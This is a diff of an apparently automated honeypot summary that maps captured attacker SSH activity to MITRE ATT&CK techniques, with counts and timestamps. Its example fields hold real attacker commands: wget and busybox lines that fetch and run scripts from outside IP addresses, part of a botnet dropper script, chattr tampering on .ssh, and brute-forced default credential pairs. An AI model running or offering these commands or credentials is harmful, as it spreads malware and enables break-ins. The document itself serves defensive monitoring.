@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-21 13:02:44",
+  "generated": "2026-09-21 14:03:43",
   "totals": {
-    "commands": 1325,
-    "login_failed": 4202,
-    "login_success": 366,
-    "sessions": 4596
+    "commands": 1391,
+    "login_failed": 4223,
+    "login_success": 370,
+    "sessions": 4637
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4202,
+      "count": 4223,
       "examples": [
         "root / 654321",
         "scout / scout",
@@ -21,14 +21,14 @@
         "user / 11q2w3e4r5t"
       ],
       "first": "2026-09-21T00:00:00.681036Z",
-      "last": "2026-09-21T13:02:38.663995Z",
-      "unique_ips": 70
+      "last": "2026-09-21T14:00:52.760407Z",
+      "unique_ips": 73
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 366,
+      "count": 370,
       "examples": [
         "root / root",
         "root / vizxv",
@@ -37,8 +37,8 @@
         "zhangc / zhangc123"
       ],
       "first": "2026-09-21T00:19:23.395124Z",
-      "last": "2026-09-21T12:59:06.053626Z",
-      "unique_ips": 56
+      "last": "2026-09-21T13:58:15.168372Z",
+      "unique_ips": 59
     },
     {
       "id": "T1083",
@@ -72,26 +72,10 @@
       "unique_ips": 27
     },
     {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 71,
-      "examples": [
-        "cd /tmp;rm -rf wget.sh; wget http://58.211.144.243:800/wget.sh; busybox wget http://58.211.144.243:800/wget.sh; curl -O ",
-        "http://58.211.144.243:800/wget.sh",
-        "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
-        "http://58.211.144.243:800/arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i486 m68k powerpc x86_64",
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
-      ],
-      "first": "2026-09-21T00:19:23.495089Z",
-      "last": "2026-09-21T12:59:24.248384Z",
-      "unique_ips": 22
-    },
-    {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 54,
+      "count": 84,
       "examples": [
         "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
@@ -100,8 +84,24 @@
         "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va"
       ],
       "first": "2026-09-21T00:19:31.058459Z",
-      "last": "2026-09-21T12:46:46.359873Z",
-      "unique_ips": 22
+      "last": "2026-09-21T13:10:37.263188Z",
+      "unique_ips": 24
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 77,
+      "examples": [
+        "cd /tmp;rm -rf wget.sh; wget http://58.211.144.243:800/wget.sh; busybox wget http://58.211.144.243:800/wget.sh; curl -O ",
+        "http://58.211.144.243:800/wget.sh",
+        "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
+        "http://58.211.144.243:800/arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i486 m68k powerpc x86_64",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+      ],
+      "first": "2026-09-21T00:19:23.495089Z",
+      "last": "2026-09-21T13:10:37.263188Z",
+      "unique_ips": 24
     },
     {
       "id": "T1057",
@@ -121,7 +121,7 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 26,
+      "count": 28,
       "examples": [
         "w",
         "whoami",
@@ -129,8 +129,8 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-21T00:43:44.912463Z",
-      "last": "2026-09-21T12:47:07.566690Z",
-      "unique_ips": 14
+      "last": "2026-09-21T13:09:45.063137Z",
+      "unique_ips": 16
     },
     {
       "id": "T1489",
@@ -189,27 +189,27 @@
   "unmapped": [
     [
       "system",
-      310
+      313
     ],
     [
       "sh",
-      310
+      313
     ],
     [
       "shell",
-      28
+      31
     ],
     [
       "/bin/busybox UNSTABLE",
-      26
+      27
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      24
     ],
     [
       "sh 0",
       10
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
     ],
     [
       "echo SHELL_TEST",
@@ -240,6 +240,14 @@
       4
     ],
     [
+      "enable",
+      4
+    ],
+    [
+      "linuxshell",
+      4
+    ],
+    [
       "/bin/busybox",
       4
     ],
@@ -248,24 +256,16 @@
       3
     ],
     [
-      "echo WGET_CHECK",
-      2
+      "enablelinuxshell",
+      3
     ],
     [
-      "echo INFECT_CHECK",
-      2
+      "ping ;sh",
+      3
     ],
     [
-      "enable",
-      2
-    ],
-    [
-      "linuxshell",
-      2
-    ],
-    [
-      "!v54!",
-      2
+      "cd /proc && cat self/cmdline",
+      3
     ]
   ]
 }
